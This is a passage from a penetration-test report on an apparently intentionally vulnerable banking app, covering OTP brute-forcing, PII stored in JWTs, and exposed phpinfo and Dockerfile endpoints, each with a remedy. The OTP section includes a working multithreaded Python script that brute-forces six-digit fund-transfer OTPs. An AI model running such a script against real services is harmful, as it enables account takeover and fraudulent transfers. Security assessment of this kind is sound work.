An additional critical issue affecting the funds transfer functionality is the ability to **bruteforce the OTP** without any restriction on the number of attempts. This flaw enables an attacker—**after hijacking a valid user session**—to systematically try all possible 6-digit OTPs until the correct one is found.

Normally, OTP verification systems enforce strict attempt limits (e.g., 3–5 tries) and expiry times to mitigate such attacks. However, in this application, the OTP mechanism lacks proper enforcement of retry limits for `otp_type = 3` (fund transfer). Combined with the absence of rate limiting or IP blacklisting, this exposes the endpoint to brute-force attacks.

The following multithreaded Python script demonstrates how an attacker could exploit this flaw to discover a valid OTP in real time:

```python
import requests
import json
import time
import threading

# === Configuration ===
url = "http://localhost/api/otp/verify"
token = "[JWT TOKEN HERE]"  # Replace with the actual JWT or session token

headers = {
    "Content-Type": "application/json"
}

# === Request Builder ===
def build_request(otp):
    return {
        "requestBody": {
            "token": token,
            "timestamp": int(time.time()),
            "device": {
                "deviceid": "UHDGGF735SVHFVSX",
                "os": "ios",
                "host": "lucideustech.com"
            },
            "data": {
                "otp": otp
            }
        }
    }

# === Brute-force Logic ===
found_flag = threading.Event()  # Shared flag to stop all threads once OTP is found

def brute_force_range(start, end):
    for otp_int in range(start, end + 1):
        if found_flag.is_set():
            break  # Stop if another thread succeeded

        otp_str = f"{otp_int:06d}"  # Format as 6-digit string
        req = build_request(otp_str)

        try:
            response = requests.post(url, headers=headers, json=req)
        except requests.RequestException as e:
            print(f"[{otp_str}] Request error: {e}")
            continue

        if response.status_code != 200:
            print(f"[{otp_str}] HTTP error: {response.status_code}")
            continue

        try:
            resp_json = response.json()
        except ValueError:
            print(f"[{otp_str}] Invalid JSON response")
            continue

        status = resp_json.get("status", "")
        status_code = resp_json.get("status_code", "")
        message = resp_json.get("message", "")

        if status == "Success":
            print(f"\n[+] OTP FOUND: {otp_str}")
            print(json.dumps(resp_json, indent=2))
            found_flag.set()
            break
        else:
            print(f"Trying OTP {otp_str}: {message} ({status_code})")

# === Launch Brute-force with 4 Threads ===
if __name__ == "__main__":
    total = 999999
    step = (total + 1) // 4  # Divide 6-digit space across 4 threads

    threads = []
    for i in range(4):
        start = i * step
        end = (i + 1) * step - 1 if i < 3 else total
        t = threading.Thread(target=brute_force_range, args=(start, end))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
```

**Vulnerability Score:**  
This is a **Critical issue (CVSS ~9.0)** because unrestricted OTP attempts enable attackers with a valid session to brute-force sensitive actions like fund transfers.

**Remedy:**  
Implement strict retry limits on OTP verification (e.g., max 3–5 attempts) with automatic lockout or cooldown periods. Enforce short OTP expiration times and monitor for suspicious activity. Add rate limiting and IP blacklisting to reduce brute-force feasibility.

---
### 12. PII in JWT Tokens

In the analyzed application, the JSON Web Token (JWT) stored in local storage contains a large amount of **Personally Identifiable Information (PII)**, including the user's full name, address, date of birth, mobile number, email address, Aadhar ID, PAN card number, account number, account balance, and other financial details. This violates a fundamental principle of secure token design: **JWTs should contain only essential claims** required for session validation or authorization, not sensitive user data.

The inclusion of PII within the JWT is especially concerning because JWTs are typically stored client-side and transmitted with each authenticated request. This increases the exposure surface. If the JWT is ever compromised — through cross-site scripting (XSS), insecure transport, or browser extensions — the attacker would gain immediate access to highly sensitive identity and financial information without needing to query the backend or elevate privileges. Unlike server-side session variables, client-side JWTs cannot be redacted or hidden from the user or other JavaScript code running in the browser.

Moreover, JWTs are base64-encoded, not encrypted. This means any observer with access to the token (e.g., via browser dev tools or logs) can trivially decode and view the full payload using online tools or a simple script. The mere presence of PII in this format is a **data privacy violation** under most regulatory frameworks such as GDPR, India's DPDP Act, or even common banking security guidelines.

This design decision effectively turns each token into a portable identity document, vulnerable to theft and misuse. The better approach would be to store only a unique user identifier (e.g., `sub`) and a few non-sensitive claims (e.g., `exp`, `iat`), while all sensitive data should remain server-side and retrieved only via authenticated, controlled API calls. This minimizes risk, limits exposure, and aligns with modern security best practices.

#### Sample JWT Decoded Payload:

```json
{
  "acctNo": "076844001854",
  "acctBalance": "384377.22",
  "incomeTaxNumber": "0260245742",
  "acctOpeningDate": "2025-07-06 00:00:00",
  "currency": "INR",
  "fname": "aaaaa",
  "lname": "aaaaa",
  "address": "1, aa, aaa",
  "dob": "2008-06-29",
  "mobileNo": "1111111111",
  "email": "aaa@mail.com",
  "aadharId": "001616570010",
  "panCardId": "6018955884",
  "walletId": "8809093793",
  "gender": "2",
  "countryId": "IND",
  "exp": 1752497871
}
```

**Vulnerability Score:**  
This is a **High severity issue (CVSS ~7.0)** due to sensitive personal and financial data exposure risk through client-side tokens.

**Remedy:**  
Limit JWT payloads to minimal necessary claims such as user ID (`sub`), expiration (`exp`), and issued-at (`iat`). Store all sensitive user information securely on the server and provide it via authenticated API calls only. Consider encrypting tokens if sensitive data must be included. Also, enforce secure transmission (HTTPS) and protect against XSS to reduce token theft risk.

---
### 13. Exposed Developer and Debug Endpoints

While inspecting how the frontend communicates with the backend, I noticed that API calls were being made to a server hosted on port `80`. Out of curiosity, I accessed the same port directly through my browser to see if it was publicly exposed. To my surprise, the server responded — albeit initially with a generic "File Not Found" message.

![](/Screenshots/unsafebank//pent/backend.png)

This prompted me to dig deeper. I began exploring common developer and debug endpoints and quickly discovered several critical exposures. Notably, the backend was serving a **publicly accessible `phpinfo()` page**, a classic misconfiguration that reveals detailed environment information, including PHP version, loaded extensions, configuration directives, and even partial server paths.

![](/Screenshots/unsafebank//pent/phpinfo.png)

Even more concerning, the **Dockerfile** used to build the application environment was also accessible via HTTP. This file often contains sensitive build instructions, environment variables, internal service names, and possibly even secrets if not handled properly. Exposure of such internal build artifacts drastically lowers the effort required for an attacker to replicate, reverse engineer, or exploit the environment.

This kind of exposure is a textbook example of **Security Misconfiguration** (OWASP A6). Development and debug endpoints should never be accessible in a production environment. They serve no purpose to end-users and only increase the attack surface, offering insight into the underlying stack and infrastructure that can be weaponized during an attack.

**Vulnerability Score:**  
This is a **Medium to High severity issue (CVSS ~6.5)** because it leaks sensitive system and environment information that can facilitate further attacks.

**Remedy:**  
Remove or restrict access to all developer/debug endpoints like `phpinfo()` and Dockerfiles in production. Use network controls, authentication, or IP whitelisting for such pages if absolutely necessary. Adopt secure deployment practices to avoid exposing internal files and disable verbose error/debug output.

# VI. Conclusion

This assessment revealed several critical vulnerabilities that significantly threaten the application’s security. The most severe issues include the login brute-force weakness, allowing unlimited password guessing; the IDOR flaw that lets attackers access any user’s account data by modifying user IDs; and insecure deserialization in the loan API, enabling remote code execution and web shell deployment.

Additional problems like user enumeration, sensitive information stored in JWTs, and exposed debug endpoints further increase the risk of data theft and system compromise. These findings highlight gaps in input validation, access control, and overall security practices.

Addressing these vulnerabilities by enforcing rate limiting, tightening authorization, sanitizing inputs, securing sensitive data, and removing unnecessary debug interfaces is essential to protect users and maintain a secure application environment.